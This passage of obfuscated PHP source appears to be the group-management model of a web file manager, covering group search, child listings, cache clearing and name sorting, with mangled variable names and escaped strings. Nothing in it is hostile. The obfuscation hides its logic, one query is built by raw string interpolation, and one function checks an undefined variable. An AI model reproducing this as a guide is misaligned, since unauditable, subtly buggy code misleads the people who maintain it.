&$Í›åü¯Õ) { $¹Æ½„±Ç =& $_SERVER[ÓïÕü]; if (isset($Í›åü¯Õ[$¹Æ½„±Ç[32]])) { $this->setNamePinyin($Ïæ¸ÖÜˆ, $Í›åü¯Õ[$¹Æ½„±Ç[32]]); } if (isset($Í›åü¯Õ[$¹Æ½„±Ç[2097]])) { $ş÷ÒŞ‚Á = array($¹Æ½„±Ç[2097] => $Í›åü¯Õ[$¹Æ½„±Ç[2097]], $¹Æ½„±Ç[2098] => $Í›åü¯Õ[$¹Æ½„±Ç[2098]]); unset($Í›åü¯Õ[$¹Æ½„±Ç[2097]]); unset($Í›åü¯Õ[$¹Æ½„±Ç[2098]]); if (isset($Í›åü¯Õ[$¹Æ½„±Ç[2099]])) { $™²»ÊÏö = $¹Æ½„±Ç[1414] . $Ïæ¸ÖÜˆ; $Íéæµ¡ = $¹Æ½„±Ç[1413]; $æÛ™–Ì› = $Í›åü¯Õ[$¹Æ½„±Ç[2099]] ? $Í›åü¯Õ[$¹Æ½„±Ç[2099]] : $¹Æ½„±Ç[12]; $£ªüÒÑÑ = Model($¹Æ½„±Ç[1412])->get($™²»ÊÏö, $Íéæµ¡); $£ªüÒÑÑ = $£ªüÒÑÑ ? $£ªüÒÑÑ : $¹Æ½„±Ç[12]; if ($£ªüÒÑÑ != $æÛ™–Ì›) { if (!$æÛ™–Ì› && $£ªüÒÑÑ) { Model($¹Æ½„±Ç[1412])->remove($™²»ÊÏö, $Íéæµ¡); } else { if ($æÛ™–Ì›) { Model($¹Æ½„±Ç[1412])->set($™²»ÊÏö, $æÛ™–Ì›, $Íéæµ¡); } } } $ş÷ÒŞ‚Á[$¹Æ½„±Ç[2099]] = $æÛ™–Ì›; } $this->metaSet($Ïæ¸ÖÜˆ, $ş÷ÒŞ‚Á); } } private function _clearChildrenCache($à—ÀÎ£å) { $Óª¦Ñ®ı =& $_SERVER[ÓïÕü]; $ˆ¿Íøşê = array($Óª¦Ñ®ı[660] => array($Óª¦Ñ®ı[620], $à—ÀÎ£å[$Óª¦Ñ®ı[589]] . $à—ÀÎ£å[$Óª¦Ñ®ı[1418]] . $Óª¦Ñ®ı[621])); $ü«£«¬ = $this->field($Óª¦Ñ®ı[1418])->where($ˆ¿Íøşê)->select(); foreach ($ü«£«¬ as $¡³»î§) { $this->_clearCache($¡³»î§[$Óª¦Ñ®ı[1418]]); } } private function _clearCache($×¨ˆ¡“í) { $ŒÏá•ÏÌ =& $_SERVER[ÓïÕü]; $this->cacheFunctionClear($ŒÏá•ÏÌ[2092], $×¨ˆ¡“í); $this->cacheFunctionClear($ŒÏá•ÏÌ[2093], $×¨ˆ¡“í); } private function _changeChildLevel($â’çÍİß, $ó—ô©½Ã, $êŒ…¹ = false) { $È •¿Ó =& $_SERVER[ÓïÕü]; $Èñœçà = $â’çÍİß[$È •¿Ó[589]] . $â’çÍİß[$È •¿Ó[1418]] . $È •¿Ó[50]; $†¼ú³Ë = $ó—ô©½Ã[$È •¿Ó[589]] . $ó—ô©½Ã[$È •¿Ó[1418]] . $È •¿Ó[50] . $â’çÍİß[$È •¿Ó[1418]] . $È •¿Ó[50]; if ($êŒ…¹) { $†¼ú³Ë = $ó—ô©½Ã[$È •¿Ó[589]] . $ó—ô©½Ã[$È •¿Ó[1418]] . $È •¿Ó[50]; } $÷òù¦áÈ = array($È •¿Ó[660] => array($È •¿Ó[620], $â’çÍİß[$È •¿Ó[589]] . $â’çÍİß[$È •¿Ó[1418]] . $È •¿Ó[621])); $£Ş¹Š‰÷ = array($È •¿Ó[660] => array($È •¿Ó[669], "\162\x65\160\x6c\x61\x63\x65\x28\160\141\x72\x65\x6e\164\x4c\x65\x76\145\154\54\x27{$Èñœçà}\47\x2c\47{$†¼ú³Ë}\47\51")); $this->_clearChildrenCache($â’çÍİß); $this->where($÷òù¦áÈ)->data($£Ş¹Š‰÷)->save(); } public function setNamePinyin($ºÅ²¡‚Ü, $§ãÄªÏÅ = false) { $°«æø‹ =& $_SERVER[ÓïÕü]; if (!$§ãÄªÏÅ) { $ƒ¾…¼Ì¬ = $this->getInfoSimple($ºÅ²¡‚Ü); $§ãÄªÏÅ = $ƒ¾…¼Ì¬[$°«æø‹[32]]; } if (!Input::check($§ãÄªÏÅ, $°«æø‹[663])) { $this->metaSet($ºÅ²¡‚Ü, $°«æø‹[541], null); $this->metaSet($ºÅ²¡‚Ü, $°«æø‹[540], null); return; } $“ùÇ–şí = array($°«æø‹[541] => str_replace($°«æø‹[53], $°«æø‹[12], Pinyin::get($§ãÄªÏÅ)), $°«æø‹[540] => Pinyin::get($§ãÄªÏÅ, $°«æø‹[664])); $this->metaSet($ºÅ²¡‚Ü, $“ùÇ–şí); } protected function metaSet($ÙÓ¿˜‹, $½ÕÌ†Ÿ = null, $æ›õÚÎ = null) { $this->_clearCache($ÙÓ¿˜‹); return parent::metaSet($ÙÓ¿˜‹, $½ÕÌ†Ÿ, $æ›õÚÎ); } protected function groupStatus($à˜•øğ, $Şğ‹™Ê) { $¡áûµÇ‰ =& $_SERVER[ÓïÕü]; $Ü¦ˆÛê = $this->getInfoSimple($à˜•øğ); if (!$Ü¦ˆÛê) { return !1; } $this->_clearCache($à˜•øğ); return $this->metaSet($à˜•øğ, $¡áûµÇ‰[841], $Şğ‹™Ê); if ($Şğ‹™Ê == $¡áûµÇ‰[91]) { $î¸àã¯ = $this->parentLevelArray($Ü¦ˆÛê[$¡áûµÇ‰[589]]); } else { } $î¸àã¯[] = $Ü¦ˆÛê[$¡áûµÇ‰[1418]]; $¸Å˜äÒ = array(); foreach ($î¸àã¯ as $à˜•øğ) { $¸Å˜äÒ[] = array($¡áûµÇ‰[1418] => $à˜•øğ, $¡áûµÇ‰[97] => $¡áûµÇ‰[841], $¡áûµÇ‰[453] => $Şğ‹™Ê); $this->_clearCache($à˜•øğ); } return Model($¡áûµÇ‰[2100])->addAll($¸Å˜äÒ, array(), !0); } protected function groupRemove($áº’¥¦·, $§‚ä†Í = false) { $ÌÎÂÚ³ù =& $_SERVER[ÓïÕü]; $›’×™ÙÀ = array($ÌÎÂÚ³ù[1418] => $áº’¥¦·); $Î‹¢î´ = $this->where($›’×™ÙÀ)->find(); if (!$Î‹¢î´ || $Î‹¢î´[$ÌÎÂÚ³ù[193]] == 0) { return !1; } if (!$§‚ä†Í) { $Ó¯åÍÓš = $this->getInfoSimple($Î‹¢î´[$ÌÎÂÚ³ù[193]]); $this->_changeChildLevel($Î‹¢î´, $Ó¯åÍÓš, !0); $this->where(array($ÌÎÂÚ³ù[193] => $áº’¥¦·))->save(array($ÌÎÂÚ³ù[193] => $Î‹¢î´[$ÌÎÂÚ³ù[193]])); $this->_clearCache($Ó¯åÍÓš[$ÌÎÂÚ³ù[1418]]); } Model($ÌÎÂÚ³ù[2100])->where($›’×™ÙÀ)->delete(); Model($ÌÎÂÚ³ù[2101])->where($›’×™ÙÀ)->delete(); Model($ÌÎÂÚ³ù[921])->groupRootRemove($áº’¥¦·); $this->_clearCache($Î‹¢î´[$ÌÎÂÚ³ù[193]]); return $this->where($›’×™ÙÀ)->delete(); } protected function groupSort($¾Á¾¾š) { $‰ŠÆ˜Ãµ =& $_SERVER[ÓïÕü]; $³ìñ—‹Ù = array(); foreach ($¾Á¾¾š as $¤¬ÑÂÆª => $ŠÌ›) { $³ìñ—‹Ù[] = array($‰ŠÆ˜Ãµ[1418], $ŠÌ›, $‰ŠÆ˜Ãµ[2030], $¤¬ÑÂÆª + 1); } $this->saveAll($³ìñ—‹Ù); } public function listData() { $½Ïµø¿¶ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($½Ïµø¿¶[$_SERVER[ÓïÕü][448]]); return $½Ïµø¿¶; } private function _makeOrder($«·ùÃãÖ = '') { $µ·Õà¤Î =& $_SERVER[ÓïÕü]; $Ş«Ü¹ù² = array($µ·Õà¤Î[1418], $µ·Õà¤Î[32], $µ·Õà¤Î[1995], $µ·Õà¤Î[234]); $óƒƒš = array($µ·Õà¤Î[526] => $µ·Õà¤Î[527], $µ·Õà¤Î[528] => $µ·Õà¤Î[529]); $„ò…À÷¶ = Input::get($µ·Õà¤Î[533], $µ·Õà¤Î[7], $µ·Õà¤Î[2010], $Ş«Ü¹ù²); $Ü™—¬‰ = Input::get($µ·Õà¤Î[534], $µ·Õà¤Î[7], $µ·Õà¤Î[2102], array($µ·Õà¤Î[2102], $µ·Õà¤Î[528])); $Ü™—¬‰ = $óƒƒš[$Ü™—¬‰]; $«·ùÃãÖ = $«·ùÃãÖ . "{$„ò…À÷¶}\x20{$Ü™—¬‰}\54\40\x67\x72\x6f\165\x70\111\104\40\141\163\x63"; return $this->order($«·ùÃãÖ); } public function listChild($íØÙŸ‹Ø) { $¢ÎÒ¢ş =& $_SERVER[ÓïÕü]; $¸èô™çÆ = $this->where(array($¢ÎÒ¢ş[193] => $íØÙŸ‹Ø))->_makeOrder()->selectPage(200); $this->_listDataApply($¸èô™çÆ[$¢ÎÒ¢ş[448]]); return $¸èô™çÆ; } public function listChildIds($³ÀŒü‚Ñ) { $Ù­Ú«Ÿå =& $_SERVER[ÓïÕü]; if (is_string($ş³ïïÊ)) { $³ÀŒü‚Ñ = explode($Ù­Ú«Ÿå[50], $³ÀŒü‚Ñ); } $†ûæ£ = $this->where(array($Ù­Ú«Ÿå[1418] => array($Ù­Ú«Ÿå[7], $³ÀŒü‚Ñ)))->field($Ù­Ú«Ÿå[2103])->select(); if (!$†ûæ£) { return !1; } $”‚˜õí = array(); foreach ($†ûæ£ as $Åšââ­) { $”‚˜õí[] = "\163\145\x6c\145\143\164\40\x67\x72\157\x75\x70\111\x44\x20\x66\162\157\x6d\40\x60\147\162\x6f\165\160\140\40\x77\x68\x65\x72\x65\40\x70\x61\162\x65\156\164\114\145\166\145\154\40\154\151\x6b\x65\x20\x27{$Åšââ­[$Ù­Ú«Ÿå[589]]}{$Åšââ­[$Ù­Ú«Ÿå[1418]]}\x2c\45\47"; } $”‚˜õí = implode($Ù­Ú«Ÿå[2104], $”‚˜õí); $†ûæ£ = $this->query($”‚˜õí); if (!$†ûæ£) { return array(); } $³ÀŒü‚Ñ = array_to_keyvalue($†ûæ£, $Ù­Ú«Ÿå[12], $Ù­Ú«Ÿå[1418]); return array_unique($³ÀŒü‚Ñ); } public function listByID($¿Ñ‹éå) { $ó´ä€ÂÅ =& $_SERVER[ÓïÕü]; if (!$¿Ñ‹éå) { return array(); } $æ€„åÔ¡ = array($ó´ä€ÂÅ[1418] => array($ó´ä€ÂÅ[7], $¿Ñ‹éå)); $€”ËÙŞ = $this->where($æ€„åÔ¡)->select(); $€”ËÙŞ = array_sort_keep($€”ËÙŞ, $ó´ä€ÂÅ[1418], $¿Ñ‹éå); $this->_listDataApply($€”ËÙŞ); return $€”ËÙŞ; } public function listSearch($×‡í‡ä”) { $ô±ÃÌå =& $_SERVER[ÓïÕü]; $Óâ›ïÑ = trim($×‡í‡ä”[$ô±ÃÌå[2105]]); $İõáŞÈŞ = explode($ô±ÃÌå[53], $Óâ›ïÑ); if (!$Óâ›ïÑ || count($İõáŞÈŞ) == 1) { return $this->listSearchNow($×‡í‡ä”); } $Ù¢¦¥‘÷ = array($ô±ÃÌå[448] => array()); foreach ($İõáŞÈŞ as $ßõï§ü¹) { if (!trim($ßõï§ü¹)) { continue; } $×‡í‡ä”[$ô±ÃÌå[2105]] = $ßõï§ü¹; $¡‰ŒÚ‚ = $this->listSearchNow($×‡í‡ä”); $Ù¢¦¥‘÷[$ô±ÃÌå[448]] = array_merge($Ù¢¦¥‘÷[$ô±ÃÌå[448]], $¡‰ŒÚ‚[$ô±ÃÌå[448]]); } $Ù¢¦¥‘÷[$ô±ÃÌå[448]] = array_unique_by_key($Ù¢¦¥‘÷[$ô±ÃÌå[448]], $ô±ÃÌå[1418]); $Ù¢¦¥‘÷[$ô±ÃÌå[445]] = array($ô±ÃÌå[446] => count($Ù¢¦¥‘÷[$ô±ÃÌå[448]]), $ô±ÃÌå[442] => 20, $ô±ÃÌå[431] => 1, $ô±ÃÌå[447] => 1); return $Ù¢¦¥‘÷; } public function listSearchNow($ş¥à¿¢) { $à´ï”¾ó =& $_SERVER[ÓïÕü]; $à÷ØÔ‘Í = trim($ş¥à¿¢[$à´ï”¾ó[2105]]); $ÕğÎÏ¡ = isset($ş¥à¿¢[$à´ï”¾ó[2106]]) ? $ş¥à¿¢[$à´ï”¾ó[2106]] : !1; if (!trim($à÷ØÔ‘Í)) { return !1; } $à÷ØÔ‘Í = str_replace($à´ï”¾ó[2107], $à´ï”¾ó[2108], $à÷ØÔ‘Í); $ù‡ë”ÕÉ = array($à´ï”¾ó[1418] => array($à´ï”¾ó[462], "{$à÷ØÔ‘Í}\45"), $à´ï”¾ó[32] => array($à´ï”¾ó[462], "\45{$à÷ØÔ‘Í}\45"), $à´ï”¾ó[1104] => $à´ï”¾ó[2109]); if ($ÕğÎÏ¡) { $ùÚúÙŸá = $this->getInfoSimple($ÕğÎÏ¡); $ú¼ÄÑâœ = $ùÚúÙŸá[$à´ï”¾ó[589]] . $ÕğÎÏ¡ . $à´ï”¾ó[621]; $ù‡ë”ÕÉ = array($ù‡ë”ÕÉ, array($à´ï”¾ó[589] => array($à´ï”¾ó[462], $ú¼ÄÑâœ))); } $ù‡ë”ÕÉ = $this->parseWhereLike($ù‡ë”ÕÉ); $üãŞÚÈÕ = $this->_makeOrder()->where($ù‡ë”ÕÉ)->selectPage(20); $üãŞÚÈÕ = $üãŞÚÈÕ ? $üãŞÚÈÕ : array($à´ï”¾ó[448] => array(), $à´ï”¾ó[445] => array()); if (!$üãŞÚÈÕ || count($üãŞÚÈÕ[$à´ï”¾ó[448]]) < 5 && Input::check($à÷ØÔ‘Í, $à´ï”¾ó[396])) { $©À¿áÕô = $this->groupChildrenAll($ÕğÎÏ¡); $êË…öî’ = $this->_searchFromMeta($à´ï”¾ó[540], $à÷ØÔ‘Í, 10, $©À¿áÕô); $»¤œÁ€¢ = $this->_searchFromMeta($à´ï”¾ó[541], $à÷ØÔ‘Í, 10, $©À¿áÕô); $”×‚Ä¶€ = array_merge($êË…öî’, $»¤œÁ€¢, $üãŞÚÈÕ[$à´ï”¾ó[448]]); $üãŞÚÈÕ[$à´ï”¾ó[448]] = array_unique_by_key($”×‚Ä¶€, $à´ï”¾ó[1418]); $üãŞÚÈÕ[$à´ï”¾ó[445]][$à´ï”¾ó[446]] = count($üãŞÚÈÕ[$à´ï”¾ó[448]]); $üãŞÚÈÕ[$à´ï”¾ó[445]][$à´ï”¾ó[447]] = ceil($üãŞÚÈÕ[$à´ï”¾ó[445]][$à´ï”¾ó[446]] / $üãŞÚÈÕ[$à´ï”¾ó[445]][$à´ï”¾ó[442]]); } $this->_listDataApply($üãŞÚÈÕ[$à´ï”¾ó[448]]); return $üãŞÚÈÕ; } protected function groupChildrenAll($ìšÅ) { $˜©å´Å„ =& $_SERVER[ÓïÕü]; if (!$ìšÅ) { return !1; } if (!is_array($ìšÅ)) { $ìšÅ = array($ìšÅ); } $ùŞİÕŞ’ = $ìšÅ; foreach ($ìšÅ as $ è– é) { $¶ÍÜôÑ¦ = $this->getInfoSimple($ è– é); $³­Ô‹º¥ = array($˜©å´Å„[589] => array($˜©å´Å„[462], $¶ÍÜôÑ¦[$˜©å´Å„[589]] . $ è– é . $˜©å´Å„[621])); $ı¾Î™¨Ø = $this->field($˜©å´Å„[1418])->where($³­Ô‹º¥)->select(); $ùŞİÕŞ’ = array_merge($ùŞİÕŞ’, array_to_keyvalue($ı¾Î™¨Ø, $˜©å´Å„[12], $˜©å´Å„[1418])); } return array_unique($ùŞİÕŞ’); } private function _searchFromMeta($ªŞŸäÍŸ, $íùèœ€·, $ÓÍĞò¯, $Æ€‰¢¿Ò) { $×âŒëò¶ =& $_SERVER[ÓïÕü]; $íùèœ€· = strtolower($íùèœ€·); $ı²Êôùæ = array($×âŒëò¶[97] => $ªŞŸäÍŸ, $×âŒëò¶[453] => array($×âŒëò¶[462], "\45{$íùèœ€·}\x25")); $ı²Êôùæ = $this->parseWhereLike($ı²Êôùæ); if ($Æ€‰¢¿Ò) { $ı²Êôùæ[$×âŒëò¶[1418]] = array($×âŒëò¶[7], $Æ€‰¢¿Ò); } $ó›¼ß  = Model($×âŒëò¶[2110])->where($ı²Êôùæ)->limit($ÓÍĞò¯)->select(); if (!$ó›¼ß ) { return array(); } $ó›¼ß  = array_to_keyvalue($ó›¼ß , $×âŒëò¶[12], $×âŒëò¶[1418]); $Ğ†ÕòŞ­ = $this->where(array($×âŒëò¶[2096] => array($×âŒëò¶[7], $ó›¼ß )))->select(); if (!$Ğ†ÕòŞ­) { return array(); } return $Ğ†ÕòŞ­; } protected function _listDataApplyItem($Ò¢…ğºÍ) { $ğî„•è÷ = array($Ò¢…ğºÍ); $this->_listDataApply($ğî„•è÷); return $ğî„•è÷[0]; } protected function _listDataApply(&$¶Õæ³¾Ü) { $¤åó”£„ =& $_SERVER[ÓïÕü]; if (!$¶Õæ³¾Ü) { return; } $òÉ› = array_to_keyvalue($¶Õæ³¾Ü, $¤åó”£„[12], $¤åó”£„[1418]); $this->_listAppendChildren($¶Õæ³¾Ü); $this->_listAppendChildrenMember($¶Õæ³¾Ü); $this->_listAppendMeta($¶Õæ³¾Ü, $òÉ›); $this->_listAppendParent($¶Õæ³¾Ü); $this->_listAppendSourceRoot($¶Õæ³¾Ü, $òÉ›); } private function _listAppendChildren(&$ĞØïŸ™ø) { $öÙİØæŞ =& $_SERVER[ÓïÕü]; $ÈÊƒõöÏ = array_to_keyvalue($ĞØïŸ™ø, $öÙİØæŞ[12], $öÙİØæŞ[1418]); $Á¡Ú›‚ = array($öÙİØæŞ[193] => array($öÙİØæŞ[7], $ÈÊƒõöÏ)); $ÎÍ¥ˆ¬À = array($öÙİØæŞ[193], $öÙİØæŞ[2111] => $öÙİØæŞ[570]); $úŞ±†¬ä = $this->field($ÎÍ¥ˆ¬À)->where($Á¡Ú›‚)->group($öÙİØæŞ[193])->select(); $É»æÊáÀ = array_to_keyvalue($úŞ±†¬ä, $öÙİØæŞ[193], $öÙİØæŞ[570]); foreach ($ĞØïŸ™ø as &$Øîäœßû) { $ëôºÄÙ = $Øîäœßû[$öÙİØæŞ[1418]]; $Øîäœßû[$öÙİØæŞ[2112]] = isset($É»æÊáÀ[$ëôºÄÙ]) ? intval($É»æÊáÀ[$ëôºÄÙ]) : !1; } unset($Øîäœßû); } private function _listAppendChildrenMember(&$ìÎÔÌÚÖ) { $æñˆĞÓÀ =& $_SERVER[ÓïÕü]; $ïÍ¾ÎÄ® = array_to_keyvalue($ìÎÔÌÚÖ, $æñˆĞÓÀ[12], $æñˆĞÓÀ[1418]); $äÔ¡‘ó‚ = array($æñˆĞÓÀ[1418] => array($æñˆĞÓÀ[7], $ïÍ¾ÎÄ®)); $³Ééñîç = array($æñˆĞÓÀ[1418], $æñˆĞÓÀ[2111] => $æñˆĞÓÀ[570]); $÷ùÌïÄÜ = Model($æñˆĞÓÀ[2101])->field($³Ééñîç)->where($äÔ¡‘ó‚)->group($æñˆĞÓÀ[1418])->select(); $³‹ª˜·¦ = array_to_keyvalue($÷ùÌïÄÜ, $æñˆĞÓÀ[1418], $æñˆĞÓÀ[570]); foreach ($ìÎÔÌÚÖ as &$±¶šÒûÇ) { $¯’»»Ä = $±¶šÒûÇ[$æñˆĞÓÀ[1418]]; $±¶šÒûÇ[$æñˆĞÓÀ[2113]] = isset($³‹ª˜·¦[$¯’»»Ä]) ? intval($³‹ª˜·¦[$¯’»»Ä]) : !1; } unset($±¶šÒûÇ); } private function _listAppendMeta(&$âÙ—Ú‚, $£Õ—ğóõ) { $Ã¡¡ÓŒÔ =& $_SERVER[ÓïÕü]; $§˜ïˆôĞ = array($Ã¡¡ÓŒÔ[1418] => array($Ã¡¡ÓŒÔ[7], $£Õ—ğóõ)); $¸ˆ¶•˜ = Model($Ã¡¡ÓŒÔ[2100])->where($§˜ïˆôĞ)->select(); $¸ˆ¶•˜ = array_to_keyvalue_group($¸ˆ¶•˜, $Ã¡¡ÓŒÔ[1418]); foreach ($¸ˆ¶•˜ as &$µäúÈ±Œ) { $µäúÈ±Œ = array_to_keyvalue($µäúÈ±Œ, $Ã¡¡ÓŒÔ[97], $Ã¡¡ÓŒÔ[453]); } unset($µäúÈ±Œ); foreach ($âÙ—Ú‚ as &$¯ôäøè‰) { $¯ôäøè‰[$Ã¡¡ÓŒÔ[544]] = array(); if (isset($¸ˆ¶•˜[$¯ôäøè‰[$Ã¡¡ÓŒÔ[1418]]])) { $¯ôäøè‰[$Ã¡¡ÓŒÔ[544]] = $¸ˆ¶•˜[$¯ôäøè‰[$Ã¡¡ÓŒÔ[1418]]]; } } unset($¯ôäøè‰); } protected function parentLevelArray($ê‰êàØï) { $ÀÂõôí£ =& $_SERVER[ÓïÕü]; $ê‰êàØï = explode($ÀÂõôí£[50], trim($ê‰êàØï, $ÀÂõôí£[50])); $ê‰êàØï = array_remove_value($ê‰êàØï, $ÀÂõôí£[231]); return $ê‰êàØï; } protected function parentInGroup($²§Ïë×¼, $³×‰®‡) { $‡‰Ó£½¤ =& $_SERVER[ÓïÕü]; $°‚‰ÃÉÔ = $this->getInfoSimple($²§Ïë×¼); if (!$°‚‰ÃÉÔ) { return !0; } $°æ³€¦ = $this->parentLevelArray($°‚‰ÃÉÔ[$‡‰Ó£½¤[589]]); $°æ³€¦[] = $²§Ïë×¼; foreach ($°æ³€¦ as $²§Ïë×¼) { if (in_array($²§Ïë×¼ . $‡‰Ó£½¤[12], $³×‰®‡)) { return !0; } } return !1; } private function _listAppendParent(&$·ô¾ãˆ) { $«ÀüõÑò =& $_SERVER[ÓïÕü]; $°Şö¼Ş± = array(); foreach ($·ô¾ãˆ as &$òÏ•Ï) { $°Şö¼Ş±[$òÏ•Ï[$«ÀüõÑò[1418]]] = $òÏ•Ï[$«ÀüõÑò[32]]; $ÛŒïåû = $this->parentLevelArray($òÏ•Ï[$«ÀüõÑò[589]]); foreach ($ÛŒïåû as $¨ôâ§¬) { if (!isset($°Şö¼Ş±[$¨ôâ§¬])) { $°Şö¼Ş±[$¨ôâ§¬] = 0; } } } unset($òÏ•Ï); foreach ($°Şö¼Ş± as $“ƒİ·— => $£·äÜ¢ú) { if ($£·äÜ¢ú) { continue; } $ÌœªŒ× = $this->getInfoSimple($“ƒİ·—); $°Şö¼Ş±[$“ƒİ·—] = $ÌœªŒ×[$«ÀüõÑò[32]]; } $é½µÇáä = $GLOBALS[$«ÀüõÑò[6]][$«ÀüõÑò[92]][$«ÀüõÑò[2114]]; if (KodUser::isRoot()) { $é½µÇáä = !1; } foreach ($·ô¾ãˆ as &$òÏ•Ï) { $ÛŒïåû = $this->parentLevelArray($òÏ•Ï[$«ÀüõÑò[589]]); $¬ÁèÃÇ† = $«ÀüõÑò[12]; foreach ($ÛŒïåû as $“ƒİ·— => $¨ôâ§¬) { if ($é½µÇáä && $“ƒİ·— == 0) { continue; } $¬ÁèÃÇ† .= $°Şö¼Ş±[$¨ôâ§¬] . $«ÀüõÑò[8]; } if ($ÛŒïåû) { $¬ÁèÃÇ† .= $òÏ•Ï[$«ÀüõÑò[32]]; } $òÏ•Ï[$«ÀüõÑò[594]] = str_replace($«ÀüõÑò[257], $«ÀüõÑò[8], $¬ÁèÃÇ†); } unset($òÏ•Ï); } private function _listAppendSourceRoot(&$¤¢ËÔ±, $áÀÖéñ“) { $Æà¾«©Ø =& $_SERVER[ÓïÕü]; $’ÀúÑÅØ = Model($Æà¾«©Ø[921])->listSourceRoot(SourceModel::TYPE_GROUP, $áÀÖéñ“); $’ÀúÑÅØ = array_to_keyvalue($’ÀúÑÅØ, $Æà¾«©Ø[574]); $’ÀúÑÅØ = array_remove_key($’ÀúÑÅØ, $Æà¾«©Ø[574]); foreach ($¤¢ËÔ± as &$œÎÅÖÕÛ) { $œÎÅÖÕÛ[$Æà¾«©Ø[90]] = $’ÀúÑÅØ[$œÎÅÖÕÛ[$Æà¾«©Ø[1418]]] ? $’ÀúÑÅØ[$œÎÅÖÕÛ[$Æà¾«©Ø[1418]]] : array(); } unset($œÎÅÖÕÛ); } protected function groupMerge($íĞ¨ İ) { $íĞ¨ İ = array_values(array_unique($íĞ¨ İ)); $¼›ŒÉÖË = array(); for ($‚òï¥“û = 0; $‚òï¥“û < count($íĞ¨ İ); $‚òï¥“û++) { $’®ù÷‘å = !1; for ($¡°¨“¢µ = 0; $¡°¨“¢µ < count($íĞ¨ İ); $¡°¨“¢µ++) { if ($‚òï¥“û == $¡°¨“¢µ) { continue; } if ($this->isParentOf($íĞ¨ İ[$¡°¨“¢µ], $íĞ¨ İ[$‚òï¥“û])) { $’®ù÷‘å = !0; break; } } if (!$’®ù÷‘å) { $¼›ŒÉÖË[] = $íĞ¨ İ[$‚òï¥“û]; } } return $¼›ŒÉÖË; } protected function isParentOf($ÌéØ®”, $°ø†ÜŒ) { $ã’ê×™ı =& $_SERVER[ÓïÕü]; if (!$ÌéØ®” || !$°ø†ÜŒ || $ÌéØ®” == $°ø†ÜŒ) { return !1; } $ÒıŠîÍ± = $this->getInfoSimple($ÌéØ®”); $ş÷—ÙË¤ = $this->getInfoSimple($°ø†ÜŒ); $íÅ…áı³ = $ÒıŠîÍ±[$ã’ê×™ı[589]] . $ÌéØ®” . $ã’ê×™ı[50]; if (substr($ş÷—ÙË¤[$ã’ê×™ı[589]], 0, strlen($íÅ…áı³)) == $íÅ…áı³) { return !0; } return !1; } public function groupShowRoot($ã‹–ç¥Õ, $“õ¢¤² = false) { $´ÍÊ»ûç =& $_SERVER[ÓïÕü]; $«í¨ûÁ¨ = $this->getInfo($ã‹–ç¥Õ); if (!$«í¨ûÁ¨) { return array(); } $Íä½¹î = $this->parentLevelArray($«í¨ûÁ¨[$´ÍÊ»ûç[589]]); $ñªóÑ³÷ = array($ã‹–ç¥Õ); if (count($Íä½¹î) == 0) { return $ñªóÑ³÷; } if ($“õ¢¤² && count($Íä½¹î) == 1) { return $ñªóÑ³÷; } if (!$«í¨ûÁ¨[$´ÍÊ»ûç[544]] || !isset($«í¨ûÁ¨[$´ÍÊ»ûç[544]][$´ÍÊ»ûç[2097]]) || $«í¨ûÁ¨[$´ÍÊ»ûç[544]][$´ÍÊ»ûç[2097]] == $´ÍÊ»ûç[867]) { return $this->groupShowRoot($Íä½¹î[count($Íä½¹î) - 1], $“õ¢¤²); } if ($«í¨ûÁ¨[$´ÍÊ»ûç[544]][$´ÍÊ»ûç[2097]] == $´ÍÊ»ûç[435]) { $«æÊ° = explode($´ÍÊ»ûç[50], $«í¨ûÁ¨[$´ÍÊ»ûç[544]][$´ÍÊ»ûç[2098]]); if ($«æÊ°) { $ñªóÑ³÷ = array_merge($ñªóÑ³÷, $«æÊ°); } } return $ñªóÑ³÷; } protected function resetParentLevel() { $µÀŠ¿ö£ =& $_SERVER[ÓïÕü]; $›ƒÛ·ş¿ = $µÀŠ¿ö£[1418]; $…„Ğì¤ = $this->select(); $…„Ğì¤ = array_to_keyvalue($…„Ğì¤, $›ƒÛ·ş¿); foreach ($…„Ğì¤ as $Â²ÌÌŸ÷) { $¾×ª“ï• = $Â²ÌÌŸ÷; $ÙÙìÀ„ş = array(); while ($¾×ª“ï•[$µÀŠ¿ö£[193]] != 0) { $ÙÙìÀ„ş[] = $¾×ª“ï•[$µÀŠ¿ö£[193]]; $¾×ª“ï• = $…„Ğì¤[$¾×ª“ï•[$µÀŠ¿ö£[193]]]; } $ÙÙìÀ„ş[] = 0; $ÙÙìÀ„ş = $µÀŠ¿ö£[50] . implode($µÀŠ¿ö£[50], array_reverse($ÙÙìÀ„ş)) . $µÀŠ¿ö£[50]; $this->setNamePinyin($Â²ÌÌŸ÷[$›ƒÛ·ş¿], $Â²ÌÌŸ÷[$µÀŠ¿ö£[32]]); $this->where(array($›ƒÛ·ş¿ => $Â²ÌÌŸ÷[$›ƒÛ·ş¿]))->save(array($µÀŠ¿ö£[660] => $ÙÙìÀ„ş)); } return $…„Ğì¤; } public function groupNameAuto($öØºğ³Æ, $…ŒØ®Ë‘) { $šÌƒ¥íÚ =& $_SERVER[ÓïÕü]; $”¢Œöìá = $this->where(array($šÌƒ¥íÚ[480] => $öØºğ³Æ))->getField($šÌƒ¥íÚ[32], !0); if (!$”¢Œöìá || !in_array($…ŒØ®Ë‘, $”¢Œöìá)) { return $…ŒØ®Ë‘; } for ($óğ£Ô¥ = 1; $óğ£Ô¥ <= count($”¢Œöìá) + 1; $óğ£Ô¥++) { $¢¼œç· = $…ŒØ®Ë‘ . "\x28{$óğ£Ô¥}\x29"; if (!in_array($¢¼œç·, $”¢Œöìá)) { return $¢¼œç·; } } } public function groupSwitch($á”±‡Ã, $‘Ñ±şÑ¢) { $úûçâÃÓ =& $_SERVER[ÓïÕü]; $­Ñ€“ü¯ = array($úûçâÃÓ[1418] => array($úûçâÃÓ[7], array($á”±‡Ã, $‘Ñ±şÑ¢))); $çêÑ±›Ì = $this->where($­Ñ€“ü¯)->select(); $çêÑ±›Ì = array_to_keyvalue($çêÑ±›Ì, $úûçâÃÓ[1418]); if (!isset($çêÑ±›Ì[$á”±‡Ã]) || !isset($çêÑ±›Ì[$‘Ñ±şÑ¢]) || $çêÑ±›Ì[$á”±‡Ã][$úûçâÃÓ[193]] == 0) { return !1; } $­Ñ€“ü¯ = array($úûçâÃÓ[1418] => $á”±‡Ã); $öÛ­á¹Ö = Model($úûçâÃÓ[2101])->where($­Ñ€“ü¯)->select(); if (!$öÛ­á¹Ö) { $öÛ­á¹Ö = array(); } foreach ($öÛ­á¹Ö as $øù¶ï‰) { $£øÆ§İ = $øù¶ï‰[$úûçâÃÓ[1806]]; $­Ñ€“ü¯ = 